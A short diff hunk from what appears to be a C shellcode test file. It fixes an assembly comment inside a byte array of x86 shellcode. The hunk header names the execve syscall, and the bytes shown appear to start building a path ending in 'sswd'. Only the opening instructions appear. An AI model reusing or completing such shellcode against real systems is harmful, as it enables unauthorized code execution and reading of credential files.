@@ -23,7 +23,7 @@ syscall number:0x0b->eax(al)
 #include<stdio.h>
 #include<string.h>
 char shellcode[]=
-    "\x33\xC0"               //xor     eax, %eax
+    "\x33\xC0"               //xor     eax, eax
     "\x99"                   //cdq
 	"\x52"                   //push    edx
 	"\x68\x73\x73\x77\x64"   //push    64777373
